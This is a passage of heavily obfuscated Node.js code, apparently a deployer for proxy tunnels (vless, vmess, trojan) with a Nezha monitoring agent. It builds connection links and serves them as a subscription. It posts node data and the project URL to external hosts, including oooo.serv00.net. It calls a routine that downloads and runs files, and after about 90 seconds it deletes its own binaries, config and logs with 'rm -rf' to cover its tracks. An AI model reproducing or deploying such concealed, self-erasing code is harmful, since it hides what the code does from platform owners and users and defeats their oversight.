_0x97eda9={_0x461ea4:0x137,_0x1ff82f:0xca,_0x27d240:0xd9,_0x160691:0x136,_0x4fe88c:0xc9,_0x35ca02:0xb6,_0x385648:0xbb,_0x2fc87c:0xc9,_0x2c332e:0xb9,_0xc25ead:0x8b},_0x218835={_0x5aaae9:0x93,_0x5be567:0x141,_0x4ba8cb:0x115};setTimeout(()=>{const _0x163f23=_0x3355,_0x15bc27={'v':'2','ps':''+_0x5bed1b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x163f23(0x137),'net':'ws','type':_0x163f23(_0x97eda9._0x461ea4),'host':_0x437ca3,'path':_0x163f23(0x12c),'tls':_0x163f23(_0x97eda9._0x1ff82f),'sni':_0x437ca3,'alpn':'','fp':_0x163f23(0x132)},_0x5613d9=_0x163f23(0x144)+UUID+'@'+CFIP+':'+CFPORT+_0x163f23(0x129)+_0x437ca3+_0x163f23(_0x97eda9._0x27d240)+_0x437ca3+_0x163f23(0x102)+_0x5bed1b+_0x163f23(_0x97eda9._0x160691)+Buffer[_0x163f23(0xd6)](JSON['stringify'](_0x15bc27))[_0x163f23(_0x97eda9._0x4fe88c)](_0x163f23(0x93))+_0x163f23(0xa6)+UUID+'@'+CFIP+':'+CFPORT+_0x163f23(0xc7)+_0x437ca3+_0x163f23(0xd9)+_0x437ca3+_0x163f23(_0x97eda9._0x35ca02)+_0x5bed1b+_0x163f23(_0x97eda9._0x385648);console['log'](Buffer['from'](_0x5613d9)[_0x163f23(_0x97eda9._0x2fc87c)](_0x163f23(0x93))),fs['writeFileSync'](subPath,Buffer[_0x163f23(0xd6)](_0x5613d9)[_0x163f23(_0x97eda9._0x4fe88c)](_0x163f23(0x93))),console[_0x163f23(_0x97eda9._0x2c332e)](FILE_PATH+_0x163f23(0xd7)),uploadNodes(),app[_0x163f23(_0x97eda9._0xc25ead)]('/'+SUB_PATH,(_0x1029c1,_0x2b7ccf)=>{const _0x848014=_0x163f23,_0x5ba3f7=Buffer[_0x848014(0xd6)](_0x5613d9)[_0x848014(0xc9)](_0x848014(_0x218835._0x5aaae9));_0x2b7ccf[_0x848014(_0x218835._0x5be567)](_0x848014(0x105),_0x848014(0xe1)),_0x2b7ccf[_0x848014(_0x218835._0x4ba8cb)](_0x5ba3f7);}),_0x55843c(_0x5613d9);},0x7d0);});}}async function uploadNodes(){const _0x3db84c={_0x53a9e5:0x13a,_0x16fa57:0x106,_0x3d7689:0xb9,_0x4bba89:0x118,_0xd27eaa:0xf7,_0x145505:0xfb,_0x2b875b:0x11d,_0x7418b3:0x9e},_0x14c4ee=_0x1ce074;if(UPLOAD_URL&&PROJECT_URL){const _0x43eef4=PROJECT_URL+'/'+SUB_PATH,_0x3d14b0={'subscription':[_0x43eef4]};try{const _0x3181a8=await axios[_0x14c4ee(_0x3db84c._0x53a9e5)](UPLOAD_URL+'/api/add-subscriptions',_0x3d14b0,{'headers':{'Content-Type':_0x14c4ee(_0x3db84c._0x16fa57)}});return _0x3181a8&&_0x3181a8[_0x14c4ee(0x130)]===0xc8?(console[_0x14c4ee(_0x3db84c._0x3d7689)]('Subscription\x20uploaded\x20successfully'),_0x3181a8):null;}catch(_0x146f8e){if(_0x146f8e[_0x14c4ee(0xed)]){if(_0x146f8e[_0x14c4ee(0xed)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x14c4ee(_0x3db84c._0x4bba89)](listPath))return;const _0x370ab1=fs[_0x14c4ee(_0x3db84c._0xd27eaa)](listPath,_0x14c4ee(_0x3db84c._0x145505)),_0x4ca7a1=_0x370ab1[_0x14c4ee(0x126)]('\x0a')[_0x14c4ee(0xc0)](_0x27616b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x14c4ee(0x112)](_0x27616b));if(_0x4ca7a1['length']===0x0)return;const _0x38b9cf=JSON[_0x14c4ee(_0x3db84c._0x2b875b)]({'nodes':_0x4ca7a1});try{const _0x596f2c=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x38b9cf,{'headers':{'Content-Type':_0x14c4ee(0x106)}});return _0x596f2c&&_0x596f2c['status']===0xc8?(console[_0x14c4ee(_0x3db84c._0x3d7689)](_0x14c4ee(_0x3db84c._0x7418b3)),_0x596f2c):null;}catch(_0xf681c5){return null;}}else return;}}function cleanFiles(){const _0x13055d={_0x198d98:0xd0,_0x888a22:0xe0,_0x2d8d99:0x12f,_0x8cedab:0xc4,_0x41cc19:0xbe,_0x434beb:0x145},_0x1153fd={_0x1374f7:0xb9,_0x3f7593:0xdb,_0x4c6f5c:0xb9,_0xbda06d:0x87};setTimeout(()=>{const _0x9978b3={_0x5a1bec:0x87},_0xf52069=_0x3355,_0xb6928=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xb6928[_0xf52069(0xd0)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xb6928[_0xf52069(_0x13055d._0x198d98)](phpPath);process[_0xf52069(_0x13055d._0x888a22)]===_0xf52069(_0x13055d._0x2d8d99)?exec(_0xf52069(0x131)+_0xb6928['join']('\x20')+_0xf52069(_0x13055d._0x8cedab),_0x52f9a8=>{const _0x27e3ba=_0xf52069;console[_0x27e3ba(0x128)](),console[_0x27e3ba(0xb9)]('App\x20is\x20running'),console[_0x27e3ba(0xb9)](_0x27e3ba(_0x9978b3._0x5a1bec));}):exec('rm\x20-rf\x20'+_0xb6928[_0xf52069(_0x13055d._0x41cc19)]('\x20')+_0xf52069(_0x13055d._0x434beb),_0x34071d=>{const _0xdbeaee=_0xf52069;console[_0xdbeaee(0x128)](),console[_0xdbeaee(_0x1153fd._0x1374f7)](_0xdbeaee(_0x1153fd._0x3f7593)),console[_0xdbeaee(_0x1153fd._0x4c6f5c)](_0xdbeaee(_0x1153fd._0xbda06d));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x492007={_0x5f28e8:0xb9,_0xafa546:0xee,_0xbb32cc:0x106,_0x5e52dd:0xc3,_0x609697:0x104},_0x2f9ce2=_0x1ce074;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2f9ce2(_0x492007._0x5f28e8)](_0x2f9ce2(_0x492007._0xafa546));return;}try{const _0x5b359d=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2f9ce2(_0x492007._0xbb32cc)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x5b359d;}catch(_0x5caba8){return console[_0x2f9ce2(_0x492007._0x5e52dd)](_0x2f9ce2(_0x492007._0x609697)+_0x5caba8[_0x2f9ce2(0x10f)]),null;}}async function startserver(){const _0x80a358={_0x5089c3:0xc3},_0x4a183e=_0x1ce074;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5d602e){console[_0x4a183e(_0x80a358._0x5089c3)](_0x4a183e(0x108),_0x5d602e);}}startserver()['catch'](_0x332673=>{const _0x42cc98={_0x5389b8:0xc3,_0x208721:0xa4},_0x424b4a=_0x1ce074;console[_0x424b4a(_0x42cc98._0x5389b8)](_0x424b4a(_0x42cc98._0x208721),_0x332673);}),app[_0x1ce074(0x11c)](PORT,()=>console[_0x1ce074(0xb9)](_0x1ce074(0xeb)+PORT+'!'));
